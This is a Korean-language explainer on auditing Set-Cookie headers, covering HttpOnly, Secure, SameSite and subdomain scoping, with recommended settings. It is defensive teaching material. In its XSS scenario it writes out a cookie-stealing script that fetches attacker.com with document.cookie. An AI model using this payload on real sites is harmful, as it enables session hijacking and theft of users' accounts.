`Set-Cookie` 헤더들을 보면서 **취약 여부**를 판단하려면, 각각의 쿠키 속성들이 **보안적으로 적절하게 설정되어 있는지**를 봐야 한다.

---

## 🔍 응답 헤더 분석

### ✅ 예시 1:

```http
Set-Cookie: company_cd=0; path=/; domain=.TT.com; secure
```

| 속성               | 의미               | 비고              |
| ---------------- | ---------------- | --------------- |
| `company_cd=0`   | 쿠키 이름과 값         | 민감 정보 여부 확인 필요  |
| `path=/`         | 전체 경로에서 유효       | ✅ 정상            |
| `domain=.TT.com` | 모든 서브도메인에 쿠키 전송  | ⚠️ 주의 필요        |
| `secure`         | HTTPS에서만 전송      | ✅ 좋아요           |
| **HttpOnly 없음**  | **자바스크립트 접근 차단 미설정** | ❌ **취약 가능성 있음** |


* **`HttpOnly`가 설정된 쿠키는 자바스크립트에서 `document.cookie`로 접근할 수 없다.**
* **XSS(크로스 사이트 스크립팅)**, 세션 하이재킹 공격으로부터 쿠키를 보호하기 위한 보안 조치.
좋은 질문입니다. `HttpOnly`가 설정되지 않았을 때 **XSS(크로스 사이트 스크립팅)** 공격이 어떻게 일어나는지를 이해하면, 왜 `HttpOnly`가 중요한지 명확히 알 수 있습니다.

## 📌 공격 시나리오 : 공격자가 악성 스크립트를 게시글에 삽입

```html
<script>
  // 쿠키 탈취 코드
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

* 브라우저는 삽입된 `<script>`를 실행
* `document.cookie`를 통해 **세션 쿠키**가 유출됨
* 공격자는 `https://attacker.com/steal?...`로 쿠키를 수집


### (1) `HttpOnly`가 **없는** 쿠키

```http
Set-Cookie: token=abc123; Path=/;
```

자바스크립트에서 접근 가능:

```js
console.log(document.cookie); 
// 출력: "token=abc123"
```


### (2) `HttpOnly`가 **있는** 쿠키

```http
Set-Cookie: token=abc123; Path=/; HttpOnly
```

자바스크립트에서 접근 불가능

---

## 💡 `domain=.TT.com` 이 위험한 이유?

* **"서브도메인 간 쿠키 공유 리스크"** 
* 이 설정은 **모든 하위(서브) 도메인 (예: `api.TT.com`, `user.TT.com`)** 에서 이 쿠키를 **공유**
* 만약 같은 도메인 하위의 서비스 중 하나라도 XSS나 취약점이 있다면,
  → **다른 서비스의 쿠키까지 탈취 가능**해짐

---

### ✅ 예시 2:

```http
Set-Cookie: ci_session_community=3nb2imaqrkqcqsmi692btqfqt9b8ir8h; path=/; HttpOnly
```

| 속성                         | 의미            | 비고                           |
| -------------------------- | ------------- | ---------------------------- |
| `ci_session_community=...` | 세션 ID로 보임     | ⚠️ 민감한 쿠키일 가능성               |
| `path=/`                   | 전체 경로 유효      | ✅ 정상                         |
| `HttpOnly`                 | JS 접근 차단      | ✅ 좋아요                        |
| **Secure 없음**              | **HTTP에서도 전송 가능** | ❌ HTTPS가 아닌 경우 **중간자 공격 위험** |

---

## 🔒 보안적으로 중요한 쿠키 속성 3가지

| 속성         | 역할                  | 미설정 시 위험      |
| ---------- | ------------------- | ------------- |
| `HttpOnly` | JS에서 접근 불가 (XSS 방지) | 세션 탈취         |
| `Secure`   | HTTPS에서만 전송         | 중간자 공격 (MITM) |
| `SameSite` | CSRF 방지             | 크로스 사이트 요청 허용 |

---

## ✅ 권장 설정 예시

```http
Set-Cookie: session_id=...; Path=/; Secure; HttpOnly; SameSite=Strict
```
